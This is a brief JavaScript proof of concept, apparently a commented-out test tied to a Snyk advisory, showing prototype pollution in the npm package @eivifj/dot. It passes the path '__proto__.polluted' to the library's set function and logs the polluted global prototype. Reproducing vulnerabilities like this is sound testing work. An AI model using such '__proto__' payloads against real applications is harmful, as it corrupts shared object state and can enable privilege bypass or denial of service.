// //https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
// test("prototype pollution in @eivifj/dot", () => {
  const a = require("@eivifj/dot");
  const path = "__proto__.polluted";

console.log({}.polluted);

  a.set({}, path, "yes");

console.log({}.polluted);
// });
